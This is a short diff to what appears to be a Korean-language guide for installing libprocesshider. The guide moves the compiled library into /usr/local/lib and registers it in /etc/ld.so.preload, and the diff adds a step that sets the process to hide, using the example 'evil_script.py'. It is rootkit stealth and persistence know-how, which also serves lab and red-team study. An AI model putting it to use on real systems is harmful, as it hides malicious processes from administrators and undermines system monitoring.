@@ -11,4 +11,9 @@ $ ~/libprocesshider$ sudo mv libprocesshider.so /usr/local/lib/
 ```
 $ echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preloa
 ```
+
+```
+libprocesshider/processhider.c의 아래 부분에서 숨길 프로세스 수정 (ex. evil_script.py)
+static const char* process_to_filter = "evil_script.py";
+```
 ---
